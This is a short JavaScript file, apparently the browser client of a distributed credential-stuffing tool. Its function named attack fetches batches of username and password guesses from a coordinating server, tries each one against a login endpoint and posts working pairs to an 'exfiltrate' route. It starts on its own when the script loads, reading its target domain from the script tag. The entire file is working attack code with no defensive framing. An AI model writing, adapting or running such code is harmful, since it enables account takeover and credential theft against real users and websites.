function attack(domain) {

    function uuidv4() {
        return ([1e7] + -1e3 + -4e3 + -8e3 + -1e11).replace(/[018]/g, c =>
            (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16)
        );
    }

    uuid = localStorage.getItem('uuid');
    if (uuid == null) {
        uuid = uuidv4();
        localStorage.setItem('uuid', uuid)
    }

    init = {headers: {'X-CLIENT-UUID': uuid}};

    exfiltrate = function (username, password) {
        fetch('/app/' + domain + '/exfiltrate/', {
            method: 'POST',
            body: JSON.stringify({
                username: username,
                password: password
            }),
            headers: {'X-CLIENT-UUID': uuid}
        })
    };

    test = function (username, password) {
        /***************** TEST FUNCTION HERE **********************/
        // just call exfiltrate(username, password) when a password is find
        console.log('test', username, password);
        var xhr = new XMLHttpRequest();
        xhr.open('POST', '/example/login/', false);
        xhr.setRequestHeader('X-CLIENT-UUID', uuid);
        xhr.send(JSON.stringify({
            'username': username,
            'password': password
        }));
        if (xhr.status === 301) {
            exfiltrate(username, password)
        }
    };


    function getSync(url) {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', url, false);
        xhr.setRequestHeader('X-CLIENT-UUID', uuid);
        xhr.send(null);
        if (xhr.status === 200 && xhr.getResponseHeader('Content-Type') === 'application/json') {
            return JSON.parse(xhr.responseText);
        } else if (xhr.status > 400) {
            throw xhr.response;
        }
    }

    moredata = true;

    function getNextChunk() {
        probes = getSync('/app/' + domain + '/probes/');
        moredata = false;
        if (probes.probes.length === 0) {
            console.log('no data, stop...');
        } else {
            for (let i = 0; i < probes.probes.length; i++) {
                probe = probes.probes[i];
                test(probe.username, probe.password);
            }
            moredata = true;
        }
        getSync('/app/' + domain + '/ack/');
        return moredata;
    }

    while (getNextChunk()) {
        console.log('get chunk...');
    }
}

attack(document.currentScript.getAttribute('domain'));
